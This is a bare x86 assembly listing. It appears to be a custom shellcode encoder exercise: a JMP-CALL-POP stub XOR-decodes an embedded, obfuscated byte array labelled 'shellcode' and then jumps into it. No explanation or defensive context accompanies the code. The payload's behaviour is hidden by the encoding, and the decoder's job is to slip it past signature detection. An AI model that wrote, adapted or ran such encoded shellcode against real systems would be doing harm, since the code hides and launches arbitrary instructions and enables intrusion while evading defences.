global _start

section .text
_start:
    jmp decode_jump
decode:
    pop esi
    xor ecx,ecx
    mov al, byte [esi + ecx]
    inc esi
decode_loop:
    mov dl,[esi+ecx]
    xor al,dl
    jz shellcode+0x1
    mov byte [esi], al
    xchg al,dl
    inc esi
    inc ecx
    jmp decode_loop

decode_jump:
    call decode
shellcode: db 0xaf,0x9e,0xa0,0x5e,0x1c,0xe,0xb6,0x66,0x57,0x49,0x8a,0x66,0xde,0x15,0x11,0x7d,0x13,0x15,0x56,0x3a,0xb3,0x58,0x72,0x31,0x6b,0x5f,0xe4,0xf,0x9c,0x82,0xc4,0xde,0xf7,0xfa,0x5a,0xfe,0x48,0xad,0x2e,0x20,0xce,0x2c,0x3a,0x8,0x1e,0x83,0x4e,0xd7,0xce,0xf3,0x2,0xf7,0xcb,0x47,0x78,0x4c,0x59,0x81,0x4f,0x1,0xe5,0xfe,0xfe